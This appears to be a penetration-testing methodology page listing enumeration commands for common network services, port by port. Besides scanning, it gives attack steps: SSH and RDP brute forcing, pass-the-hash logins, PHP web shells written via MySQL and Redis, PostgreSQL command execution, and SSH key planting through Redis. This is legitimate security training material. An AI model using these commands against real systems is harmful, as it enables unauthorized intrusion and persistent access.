---
sidebar_position: 1
title: Service Enumeration
---

# Service Enumeration

For every open port discovered during scanning, enumerate the service version and search for known vulnerabilities. This page covers enumeration procedures for the most commonly encountered services.

```bash
# Set environment variables
export TARGET=<ip>
export DOMAIN=<domain>
export USER=<username>
export PASSWORD=<password>
```

---

## General Approach

### Banner Grabbing

Use netcat to connect to a port and read the service banner:

```bash
nc -nv $TARGET <port>
```

### Version-Based Exploit Search

Once you have a service name and version:

```bash
searchsploit <service> <version>
```

Also search Google, Exploit-DB, and GitHub for `<service> <version> exploit` or `<service> <version> CVE`.

:::tip
Always enumerate every service on every port. Don't skip high ports or "uninteresting" services — a misconfigured service on port 8080 or 9090 can be your way in.
:::

---

## FTP (Port 21)

### Anonymous Login

Check if anonymous login is enabled:

```bash
ftp $TARGET
# Username: anonymous
# Password: (blank or any email)
```

Nmap script for anonymous FTP:

```bash
nmap --script ftp-anon -p 21 $TARGET
```

### Enumeration

Once connected, list files and look for sensitive data:

```bash
ls -la
cd <directory>
get <filename>
mget *
```

Check for writable directories — if you can upload files, you may be able to place a web shell (if the FTP root overlaps with a web server's document root).

### Version Exploits

Common FTP servers to check for exploits: vsftpd 2.3.4 (backdoor), ProFTPD, Pure-FTPd, Microsoft FTP.

```bash
searchsploit vsftpd
searchsploit proftpd
```

---

## SSH (Port 22)

### Version Enumeration

```bash
nmap -sV -p 22 $TARGET
nc -nv $TARGET 22
```

### Authentication Testing

Test with known/found credentials:

```bash
ssh $USER@$TARGET
ssh -i <private-key> $USER@$TARGET
```

Brute force with Hydra (use sparingly — slow and noisy):

```bash
hydra -t 4 -l $USER -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
```

### SSH Key Enumeration

If you find a private key elsewhere on the system or network, try it:

```bash
chmod 400 stolen_key
ssh -i stolen_key $USER@$TARGET
```

:::tip
If SSH allows password authentication, spray any discovered credentials against it. Users frequently reuse passwords across services.
:::

---

## HTTP / HTTPS (Ports 80, 443, 8080, 8443, etc.)

Web enumeration is covered in detail in the [Web App Methodology](/red-team/enumeration/web/methodology) page. Quick checklist here:

### Technology Fingerprinting

```bash
whatweb http://$TARGET
```

### Directory Brute Forcing

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Vulnerability Scanning

```bash
nikto -h http://$TARGET
```

### Nmap HTTP Scripts

```bash
nmap -p 80 --script http-enum $TARGET
nmap -p 80 --script http-headers $TARGET
nmap -p 80 --script http-methods --script-args http-methods.url-path='/' $TARGET
```

### CMS-Specific

WordPress:

```bash
wpscan --url http://$TARGET --enumerate ap,at,cb,dbe
```

---

## SMB (Ports 139, 445)

SMB enumeration is covered in detail on the [SMB Enumeration](/red-team/recon/active/smb-enumeration) page. Quick reference:

```bash
enum4linux-ng $TARGET
nxc smb $TARGET -u '' -p '' --shares
smbclient -L //$TARGET -N
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 $TARGET
```

Check for known SMB vulnerabilities:

```bash
nmap --script smb-vuln* -p 445 $TARGET
```

---

## DNS (Port 53)

DNS enumeration is covered on the [DNS Enumeration](/red-team/recon/active/dns-enumeration) page. Quick reference:

Attempt zone transfer:

```bash
dig axfr $DOMAIN @$TARGET
```

Enumerate records:

```bash
dnsrecon -d $DOMAIN -t std
dnsenum $DOMAIN
```

---

## SMTP (Port 25)

### User Enumeration

SMTP commands can reveal valid usernames:

```bash
nc -nv $TARGET 25
VRFY root
VRFY admin
EXPN postmaster
```

Automated user enumeration:

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $TARGET
```

:::tip
If VRFY is disabled, try RCPT TO — send a `MAIL FROM` followed by `RCPT TO:<user>@<domain>`. Valid users return a 250 response, invalid users return 550.
:::

---

## SNMP (UDP Port 161)

SNMP enumeration is covered on the [SMTP & SNMP Enumeration](/red-team/recon/active/smtp-snmp-enumeration) page. Quick reference:

```bash
snmpwalk -v2c -c public $TARGET
snmpcheck -t $TARGET -c public
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $TARGET
```

### Useful SNMP OIDs

Enumerate specific data by targeting OID branches:

```bash
# System processes
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2

# Installed software
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2

# User accounts
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25

# TCP listening ports
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.6.13.1.3

# Network interfaces
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.2.2.1.2
```

---

## LDAP (Port 389 / 636)

### Anonymous Bind

Test if anonymous LDAP queries are allowed:

```bash
ldapsearch -x -H ldap://$TARGET -b "" -s base namingContexts
```

If you get a base DN back, enumerate further:

```bash
ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" "(objectclass=*)"
```

### Authenticated Enumeration

With credentials:

```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w "$PASSWORD" -b "DC=domain,DC=com" "(objectclass=user)" sAMAccountName description memberOf
```

### Nmap LDAP Scripts

```bash
nmap -p 389 --script ldap-rootdse $TARGET
nmap -p 389 --script "ldap* and not brute" $TARGET
```

:::tip
LDAP descriptions frequently contain passwords or hints. Always check the `description` attribute for all user objects.
:::

---

## MSSQL (Port 1433)

### Connect with Impacket

```bash
impacket-mssqlclient $USER:$PASSWORD@$TARGET -windows-auth
```

### Nmap Scripts

```bash
nmap -p 1433 --script ms-sql-info $TARGET
nmap -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET
nmap -p 1433 --script ms-sql-empty-password $TARGET
```

### NetExec

```bash
nxc mssql $TARGET -u $USER -p $PASSWORD
nxc mssql $TARGET -u $USER -p $PASSWORD -q "SELECT @@version"
nxc mssql $TARGET -u $USER -p $PASSWORD -q "SELECT name FROM sys.databases"
```

Full SQL injection and database attack techniques are covered on the [SQL Injection](/red-team/exploitation/web/sql-injection) page.

---

## MySQL (Port 3306)

### Connect

```bash
mysql -h $TARGET -u $USER -p
```

### Nmap Scripts

```bash
nmap -p 3306 --script mysql-info $TARGET
nmap -p 3306 --script mysql-enum $TARGET
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET
```

### Basic Enumeration

Once connected:

```sql
SELECT version();
SELECT user();
SHOW databases;
USE <database>;
SHOW tables;
SELECT * FROM <table>;
```

Check for file read/write privileges:

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

---

## PostgreSQL (Port 5432)

### Connect

```bash
psql -h $TARGET -U $USER -d <database>
```

Default credentials to try: `postgres:postgres`, `postgres:(blank)`.

### Basic Enumeration

```sql
SELECT version();
\l                    -- List databases
\c <database>         -- Connect to database
\dt                   -- List tables
SELECT * FROM <table>;
```

### Command Execution

If you have superuser access:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

---

## RDP (Port 3389)

### Nmap Scripts

```bash
nmap -p 3389 --script rdp-enum-encryption $TARGET
nmap -p 3389 --script rdp-ntlm-info $TARGET
```

### Connect

```bash
xfreerdp /u:$USER /p:$PASSWORD /v:$TARGET /cert-ignore
xfreerdp /u:$USER /p:$PASSWORD /d:$DOMAIN /v:$TARGET /cert-ignore
```

With hash (Restricted Admin mode required):

```bash
xfreerdp /u:$USER /pth:$HASH /v:$TARGET /cert-ignore
```

### Brute Force

```bash
hydra -t 4 -l $USER -P /usr/share/wordlists/rockyou.txt rdp://$TARGET
nxc rdp $TARGET -u users.txt -p passwords.txt
```

---

## WinRM (Port 5985 / 5986)

### Check if WinRM is Open

```bash
nxc winrm $TARGET -u $USER -p $PASSWORD
```

### Connect

```bash
evil-winrm -i $TARGET -u $USER -p $PASSWORD
evil-winrm -i $TARGET -u $USER -H $HASH
```

---

## NFS (Port 2049)

### Enumerate Shares

```bash
showmount -e $TARGET
nmap -sV --script nfs-showmount $TARGET
```

### Mount a Share

```bash
mkdir /tmp/nfs
mount -t nfs $TARGET:/share /tmp/nfs
ls -la /tmp/nfs
```

Check for `no_root_squash` in `/etc/exports` on the target (if accessible) — this allows privilege escalation via SUID binaries. See the [Linux Privilege Escalation](/red-team/post-exploitation/privilege-escalation/linux) page for the full technique.

---

## RPC (Port 111 / 135)

### Linux RPC (rpcbind)

```bash
rpcinfo -p $TARGET
nmap -sV -p 111 --script rpcinfo $TARGET
```

### Windows RPC (MSRPC)

```bash
rpcclient -U "" -N $TARGET
```

Useful rpcclient commands once connected:

```bash
srvinfo              # Server info
enumdomusers         # List domain users
enumdomgroups        # List domain groups
queryuser <RID>      # Query specific user
getdompwinfo         # Domain password policy
```

### Impacket RPC Tools

```bash
impacket-rpcdump $TARGET
impacket-samrdump $TARGET
```

---

## Redis (Port 6379)

### Connect

```bash
redis-cli -h $TARGET
```

### Enumeration

```bash
INFO                  # Server information
CONFIG GET *          # All configuration
KEYS *                # All keys
GET <key>             # Read a key
```

### Exploitation

If Redis is running as root and you can write to the filesystem:

Write an SSH key:

```bash
redis-cli -h $TARGET
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET payload "\n\nssh-ed25519 AAAA... your-key\n\n"
SAVE
```

Write a web shell (if web root is known):

```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE
```

:::warning
Redis by default has no authentication. If you find it exposed, check if you can write files — this frequently leads to RCE.
:::
